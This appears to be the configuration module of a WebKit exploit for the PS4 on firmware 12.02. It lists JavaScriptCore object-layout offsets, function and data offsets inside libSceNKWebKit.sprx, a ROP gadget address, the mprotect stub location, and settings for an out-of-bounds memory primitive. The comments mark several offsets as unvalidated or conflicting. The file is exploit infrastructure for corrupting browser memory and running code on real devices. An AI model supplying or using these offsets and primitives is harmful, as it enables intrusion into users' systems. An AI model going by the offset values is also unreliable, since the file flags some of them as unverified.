// js/config.mjs

// Firmware: PS4 12.02 (Com base na análise dos TXT fornecidos)
// !! OFFSETS VALIDADOS E ATUALIZADOS COM BASE NOS ARQUIVOS DE DISASSEMBLY FORNECIDOS !!
//    É crucial continuar validando no contexto do seu exploit específico.
export const JSC_OFFSETS = {
    JSCell: {
        STRUCTURE_POINTER_OFFSET: 0x8,    // VALIDADO: mov rdx, [rsi+8] em JSC::JSObject::put. Consistent.
        // TYPE_INFO_FLAGS_OFFSET: 0x4,      // JSCell.m_flags (TypeInfo.m_flags is at Structure+0xA) // Older, see Structure
        // TYPE_INFO_TYPE_OFFSET: 0x5,       // JSCell.m_type (TypeInfo.m_type is at Structure+0x9)  // Older, see Structure
        // Based on JSC::Structure::Structure constructor:
        // These seem to be components of the first 8 bytes of JSCell, likely how StructureID and TypeInfo are packed for direct access
        // [rdi] is JSC::Structure*, but it's writing to the JSCell part of it.
        // This refers to the direct inline members of JSCell if it doesn't just point to Structure for these.
        // This needs careful distinction between JSCell's own flags/type and Structure's TypeInfo.
        // The disassembly of JSC::Structure::Structure shows it writing to [rdi], [rdi+4], [rdi+5], [rdi+6], [rdi+7]
        // where rdi is the Structure*. These are likely the JSCell's header fields.
        STRUCTURE_ID_FLATTENED_OFFSET: 0x0, // mov [rdi], ebx (ebx derived from VM field, then masked)
        CELL_TYPEINFO_TYPE_FLATTENED_OFFSET: 0x4, // mov [rdi+4], al (al from VM field)
        CELL_TYPEINFO_FLAGS_FLATTENED_OFFSET: 0x5, // mov [rdi+5], ah (ah from VM field)
        CELL_FLAGS_OR_INDEXING_TYPE_FLATTENED_OFFSET: 0x6, // mov [rdi+6], bl (bl from VM field, shifted)
        CELL_STATE_FLATTENED_OFFSET: 0x7,      // mov [rdi+7], al (al from VM field, shifted)
    },
    Structure: { // Offsets DENTRO da estrutura Structure (apontada por JSCell.STRUCTURE_POINTER_OFFSET)
        // Validated from JSC::Structure::Structure constructor (0x1638A50), rdi is Structure*
        // Note: Offsets 0x0-0x7 of Structure are the JSCell header.
        CELL_SPECIFIC_FLAGS_OFFSET: 0x8,   // mov [rdi+8], r11b (Contains 'flags' from constructor arg_0, e.g., MasqueradesAsUndefined)
        TYPE_INFO_TYPE_OFFSET: 0x9,        // mov [rdi+9], al (al from TypeInfo* arg [r8]) (Contains TypeInfo.m_type)
        TYPE_INFO_MORE_FLAGS_OFFSET: 0xA,  // mov [rdi+0Ah], al (al from [r8+1]) (Contains TypeInfo.m_flags)
        // TYPE_INFO_HAS_GETTER_SETTER_PROPERTIES: 0xB, // mov byte ptr [rdi+0Bh], 1
        TYPE_INFO_INLINE_FLAGS_OFFSET: 0xC,// mov [rdi+0Ch], ax (ax from word ptr [r8+2]) (Contains TypeInfo.m_inlineTypeFlags)
        // TYPE_INFO_INLINE_CAPACITY: 0xE, // mov [rdi+0Eh], r10b (m_inlineCapacity)
        // TYPE_INFO_HAS_BEEN_DICTIONARY: 0xF, // mov byte ptr [rdi+0Fh], 0
        AGGREGATED_FLAGS_OFFSET: 0x10,     // mov dword ptr [rdi+10h], 0 initially, then populated based on prototype flags and TypeInfo
        PROPERTY_STORAGE_CAPACITY_OFFSET: 0x18, // mov dword ptr [rdi+18h], 0 (m_propertyStorageCapacity)
        PROPERTY_TABLE_OFFSET: 0x20,           // mov qword ptr [rdi+20h], 0 (m_propertyTable)
        GLOBAL_OBJECT_OFFSET: 0x28,        // mov [rdi+28h], rdx (rdx = JSGlobalObject*)
        PROTOTYPE_OFFSET: 0x30,            // mov [rdi+30h], rcx (rcx = JSValue prototype)
        // SPECIFIC_VALUE_OFFSET: 0x38,       // Part of 16-byte zeroed region
        // SPECIFIC_FUNCTION_OFFSET: 0x40,    // Part of 16-byte zeroed region
        CACHED_OWN_KEYS_OFFSET: 0x48,          // mov qword ptr [rdi+48h], 0 (m_cachedOwnKeys)
        CLASS_INFO_OFFSET: 0x50,           // mov [rdi+50h], r9 (r9 = ClassInfo*)
        // STRUCTURE_CHAIN_OFFSET/NEXT_STRUCTURE_OFFSET: 0x58, // mov qword ptr [rdi+58h], 1 (m_offset in some contexts, but seems like a list pointer or counter here)
        // PUT_OFFSET: 0x60,                  // mov qword ptr [rdi+60h], 0 (m_putOffset)
        // ATTRIBUTES_OFFSET: 0x68,             // mov qword ptr [rdi+68h], 3 (m_attributes)
    },

    JSObject: {
        // Ponteiro para o Butterfly (armazenamento de propriedades nomeadas)
        // Comum ser após o cabeçalho JSCell (Structure* em 0x8).
        BUTTERFLY_OFFSET: 0x10, // CANDIDATO: Ponteiro para o Butterfly
    },
    JSFunction: { // Offsets DENTRO do objeto JSFunction
        EXECUTABLE_OFFSET: 0x18, // VALIDADO: mov rax, [rdi+18h] em JSC::getExecutableForFunction
        SCOPE_OFFSET: 0x20,      // Mantido, requer revalidação com JSFunction constructor.
    },
    JSCallee: { // Base for JSFunction
        GLOBAL_OBJECT_OFFSET: 0x10, // VALIDADO: mov [rdi+10h], rdx (rdx = JSGlobalObject*) in JSCallee constructor (0x2038D50)
    },
    ArrayBuffer: {
        // JSObjectGetArrayBufferByteLength (0x55C9F0) reading from JSArrayBuffer* (rsi):
        // mov rax, [rsi+10h] => rax = ArrayBufferContents*
        CONTENTS_IMPL_POINTER_OFFSET: 0x10,                // VALIDADO: [rax+10h] from JSC::ArrayBuffer::create(JSC::ArrayBufferContents &&)
                                                           // Confirmed by JSObjectGetArrayBufferBytesPtr & JSObjectGetArrayBufferByteLength.
        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x18, // VALIDADO: [rax+18h] from ArrayBufferContents.m_sizeInBytes (copied field)
        DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START: 0x20, // VALIDADO: [rax+20h] from ArrayBufferContents.m_dataPointer (copied field)
        SHARING_MODE_OFFSET: 0x28,
        IS_RESIZABLE_FLAGS_OFFSET: 0x30,
        KnownStructureIDs: {
            JSString_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
            ArrayBuffer_STRUCTURE_ID: 2, // VALIDADO do JSC::ArrayBuffer::create
            JSArray_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO
            JSObject_Simple_STRUCTURE_ID: null, // PREENCHA OU REMOVA SE NÃO USADO}
        },
    },
    ArrayBufferContents: { // Structure pointed to by ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET
        // JSObjectGetArrayBufferBytesPtr (0x1FFE830), rax is ArrayBufferContents*:
        // mov r12, [rax+10h] => r12 is data pointer
        DATA_POINTER_OFFSET_FROM_CONTENTS_START: 0x10,
        // cmp byte ptr [rax+5Ch], 0 => check if data is null (neutered). Could be data pointer itself or a wrapper.
        // mov byte ptr [rax+5Dh], 1 => pinning/usage flag.
        // JSObjectGetArrayBufferByteLength (0x55C9F0), rax is ArrayBufferContents*:
        // cmp byte ptr [rax+40h], 0 -> isShared flag?
        // If not shared: add rax, 30h ; mov rax, [rax] -> size is at [ArrayBufferContents_base+30h]
        // If shared: mov rcx, [rax+20h] (SharedArrayBufferContents_impl*) ; mov rax, [rcx+20h] (size from SharedArrayBufferContents_impl)
        // This conflicts with previous understanding of 0x8 for size.
        // For now, keeping the validated 0x8 from JSObjectGetTypedArrayBytesPtr.txt, but noting variability.
        SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START: 0x8,   // Validated from JSObjectGetTypedArrayBytesPtr.txt.
                                                         // JSObjectGetArrayBufferByteLength suggests 0x30 for non-shared,
                                                         // and [SharedContents+0x20] for shared.
        SHARED_ARRAY_BUFFER_CONTENTS_IMPL_PTR_OFFSET: 0x20, // If shared, points to another structure.
        IS_SHARED_FLAG_OFFSET: 0x40,                      // Candidate for m_isShared flag.
        RAW_DATA_POINTER_FIELD_CANDIDATE_OFFSET: 0x5C,    // Checked for null in JSObjectGetArrayBufferBytesPtr
        PINNING_FLAG_OFFSET: 0x5D,                        // Set in JSObjectGetArrayBufferBytesPtr
    },
    // SharedArrayBufferContents (pointed to by ArrayBufferContents.SHARED_ARRAY_BUFFER_CONTENTS_IMPL_PTR_OFFSET if shared)
    // SharedArrayBufferContents: {
    //    SIZE_IN_BYTES_OFFSET_FROM_SHARED_CONTENTS_START: 0x20, // From JSObjectGetArrayBufferByteLength logic
    // },
    JSGlobalObject: {
        VM_OFFSET: 0x38,                                   // VALIDADO: mov rbx, [rdi+38h] in JSC::loadAndEvaluateModule (rdi=JSGlobalObject*)
        REGEXP_CACHE_OFFSET: 0x2B0,                        // VALIDADO: [r8+2B0h] in JSC::JSGlobalObject::visitChildren
        STRUCTURE_OFFSET_PROMISE_PROTOTYPE: 0x670,         // VALIDADO: [r8+670h] in JSC::JSGlobalObject::visitChildren
        STRUCTURE_OFFSET_INTERNAL_PROMISE_PROTOTYPE: 0x678, // VALIDADO: [r8+678h] in JSC::JSGlobalObject::visitChildren
        NULL_GETTER_FUNCTION_OFFSET: 0x250,                // VALIDADO: [r13+250h] in JSC::JSGlobalObject::visitChildren
    },
    JSArrayBufferView: { // Base for TypedArrays like Uint32Array, Float32Array
        // From JSObjectGetTypedArrayBuffer (0x1786390), r13 is JSArrayBufferView*
        // TYPE_INFO_TYPE_FLATTENED_OFFSET_IN_VIEW: 0x5, // Used in type check: cmp al, 0Bh where al is [r13+5] + 0xD9
//         ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Candidate: mov rax, [r13+8] (then [rax-8] is accessed, unusual) OR part of m_vector // CORRIGIDO: Chave duplicada comentada
        M_MODE_OR_SHARING_MODE_OFFSET: 0x28, // Candidate: mov al, [r13+28h]
        M_BUFFER_POINTER_OR_BUTTERFLY_OFFSET: 0x30, // Candidate: mov rcx, [r13+30h]
        // ClassInfo/VTable like offsets relative to JSC::JSArrayBufferView::s_info (0x3AE5040)
        // These are specific method implementations for ArrayBufferView types.
        // The offsets are relative to the address of JSC::JSArrayBufferView::s_info itself.
        S_INFO_PUT_METHOD_OFFSET: 0x40, // (0x3AE5080 - 0x3AE5040)
        S_INFO_DELETE_PROPERTY_METHOD_OFFSET: 0x50, // (0x3AE5090 - 0x3AE5040)
       // M_VECTOR_OFFSET: 0x30, // Offset to the WTF::Vector-like structure or ArrayBuffer*
        // M_LENGTH_OFFSET: 0x10, // (Within the ArrayBuffer* pointed to by m_vector, if m_vector is buffer)
        // M_BUFFER_OFFSET_FROM_VIEW: 0x18, // If it directly holds an ArrayBuffer* (common pattern)
        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents             
        STRUCTURE_ID_OFFSET: 0x00,           // Seu original.
        FLAGS_OFFSET: 0x04,                  // Seu original.
        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Ponteiro para o JSArrayBuffer.
        M_VECTOR_OFFSET: 0x10,               // Ponteiro para os dados (dentro do ArrayBuffer.m_impl->data()).
        M_LENGTH_OFFSET: 0x18,               // Comprimento da view.
        M_MODE_OFFSET: 0x1C     
},
    VM: { // Offsets from VM pointer
        TOP_CALL_FRAME_OFFSET: 0x9E98, // From JSC::loadAndEvaluateModule -> rbx is VM*, [rbx+9E98h]
        // COMMON_IDENTIFIERS_OFFSET: 0x9EC0, // From JSC::JSObject::put, mov rax, [rsi+9EC0h] where rsi is VM*
        // Based on JSC::Structure::Structure constructor (0x1638A50):
        // rsi is VM-like pointer, mov rsi, [rsi+9D00h] is first instruction.
        // Then, eax = [rsi+8] is used for cell flags/type.
        // So, [VM_Related_Ptr+9D00h] points to a structure where at +8h are some cell init values.
        // FIELD_CONTAINING_CELL_INIT_VALUE_OFFSET: 0x9D08, // Offset from initial VM-like pointer.
    },
};

export const WEBKIT_LIBRARY_INFO = {
    NAME: "libSceNKWebKit.sprx",
    // Base address will be leaked at runtime.
    // These offsets are relative to the WebKit library's base address.
    FUNCTION_OFFSETS: {
        // Memory Management & GC
        "WTF::StringImpl::destroy": "0x10AA800",
        "bmalloc::Scavenger::schedule": "0x2EBDB0",
        "WTF::releaseFastMallocFreeMemoryForThisThread": "0x33B130",
        "WTF::releaseFastMallocFreeMemory": "0x1B58630",
        "WebCore::releaseMemory": "0xDBAF0",
        "JSC::JSGlobalObject::visitChildren_JSCell": "0x1A5F740",
        "WebCore::JSDOMGlobalObject::visitChildren": "0x6CEB60",
        "GC_VisitWrapper_leveAiJqBp4_Q_A": "0xF06D00",
        "JSC::SlotVisitor::appendSlow": "0x1A614C7",
        "JSC::SymbolTableEntry::freeFatEntrySlow": "0xA1D8A0", // NID: LyiYFmzddAU#Q#A

        // Structure & Object Creation/Manipulation
        "JSC::InternalFunction::createSubclassStructure": "0xA86580",
        "MemoryCopyAVX_xVFYDzK2YL8_Q_A": "0xA867F0",
        "JSC::Structure::isValidPrototype": "0x1BE8AA0",
        "JSC::getExecutableForFunction": "0xCF54F0",
        "JSC::JSFunction::create": "0x58A1D0",
        "JSC::ArrayBuffer::create_from_contents": "0x10E5320",
        "JSObjectGetTypedArrayBuffer": "0x1786390", // NID: 8D2GMMAmpC8#Q#A
        "JSObjectMakeTypedArrayWithArrayBuffer": "0x1B25AE0", // NID: 7jXS0r9rkLg#Q#A
        "JSObjectGetArrayBufferByteLength": "0x55C9F0", // NID: uAyWBZtHkgM#Q#A
        "JSC::JSObject::deletePropertyByIndex": "0x10E53F0",
        "JSC::JSCallee::JSCallee_constructor": "0x2038D50",
        "JSC::StructureCache::emptyStructureForPrototypeFromBaseStructure": "0xCCF870", // NID: 4wAbvDDNr-8#Q#A
        "JSC::Structure::Structure_constructor": "0x1638A50", // NID: wA33q23RD+A#Q#A
        "JSC::JSInternalPromise::create": "0x112BB00",
        "JSC::JSInternalPromise::then": "0x1BC2D70", // NID: We80-1Wp+Ek#Q#A
        "JSC::loadAndEvaluateModule": "0xFC2900",
        "JSC::JSObject::put_JSCell": "0xBD68B0",
        "WebCore::JSLocation::createPrototype": "0xD2E30",

        // String & Misc Utilities
        "WTF::StringPrintStream::toCString": "0x58C810",
        "WTF::fastMalloc": "0x230C490",
        "WTF::fastFree": "0x230C7D0",
        "JSValueIsSymbol": "0x126D940", // NID: LiZvA-SjCko#Q#A
        "JSObjectGetArrayBufferBytesPtr": "0x1FFE830", // NID: FEU0ygVamU4#Q#A (Original 0x2A3B50)
        "WTF::JSONImpl::ArrayBase::get": "0x8929D0",
        "WTF::JSONImpl::Value::type": "0xB3A770",
        "JSC::JSONStringify_Value_Indent": "0x1707B90", // NID: uOWeAeBDuM0#Q#A (3 args)
        "JSC::JSONStringify_Value_Replacer_Indent": "0x186FC60", // NID: hmZCJGU0rCE#Q#A (4 args)


        // Gadgets
        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",

        // Other Functions
        "mprotect_plt_stub": "0x1A08", // Jumps to GOT entry for actual mprotect
        "JSC::throwConstructorCannotBeCalledAsFunctionTypeError": "0x112BBC0",
    },
    // GOT_ENTRIES: { // Offsets relative to WebKit base, to entries in the GOT
    //    "mprotect": "0x3CBD820", // This was an absolute address from an old dump, likely needs updating to be base-relative
    // },
    DATA_OFFSETS: { // Offsets to specific data symbols, relative to WebKit base
        "JSC::JSArrayBufferView::s_info": "0x3AE5040", // NID: RwiDAkmZDdk#Q#A
        "JSC::DebuggerScope::s_info": "0x3AD5670",     // NID: 561zLg7hORI#Q#A

        // These are specific ClassInfo structures (vtables + metadata)
        // The following are likely pointers within the SCE_RELRO segment that point to ClassInfo-like data for TypedArrays.
        // Example: Uint32Array_CLASSINFO_LIKE_ADDRESS: "0x3AEBD20", (contains name "Uint32Array", parent s_info, and vtable entries)
        // Example: Float32Array_CLASSINFO_LIKE_ADDRESS: "0x3AEBF00",
        // ... Many such structures for each TypedArray type.

        // Specific Named Symbols
        "JSC::Symbols::Uint32ArrayPrivateName": "0x3CC7968",   // NID: tlgulkXDKdY#Q#A (Data: "Uint32Array")
        "JSC::Symbols::Float32ArrayPrivateName": "0x3CC7990",  // NID: a5NUHC2I-Hg#Q#A (Data: "Float32Array")
        "JSC::Symbols::Float64ArrayPrivateName": "0x3CC79B8",  // NID: 1XziIA7gRp0#Q#A (Data: "Float64Array")
        "JSC::Symbols::execPrivateName": "0x3CC7A30",          // NID: XqGqV5D9GmQ#Q#A

        // String Literals (less commonly targeted directly by offset, but useful for context)
        // "String_[Symbol.search]": "0x2BA030B", // String literal for well-known symbol
    }
};

// Configuração para a primitiva Out-Of-Bounds
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,
    BASE_OFFSET_IN_DV: 128,
    INITIAL_BUFFER_SIZE: 32
};

export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance) return;
    const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
    const baseOffsetEl = docInstance.getElementById('baseOffset');
    const initialBufSizeEl = docInstance.getElementById('initialBufSize');

    if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl && baseOffsetEl.value !== undefined) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl && initialBufSizeEl.value !== undefined) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }
}
